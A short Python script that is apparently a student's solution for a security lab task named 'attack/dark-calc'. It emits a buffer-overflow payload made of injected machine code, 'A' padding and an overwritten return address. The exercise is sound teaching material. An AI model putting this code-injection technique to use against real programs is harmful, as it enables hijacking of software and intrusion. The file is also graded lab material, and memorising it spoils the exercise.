#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
payload = b"\xbf\x04\x00\x00\x00"
payload += b"\x68\x87\x1a\x40\x00"
payload += b"\xc3"
payload += b"A" * 13
payload += b"\xd0\x0f\x80\x00\x10\x72\x00\x00"

sys.stdout.buffer.write(payload)
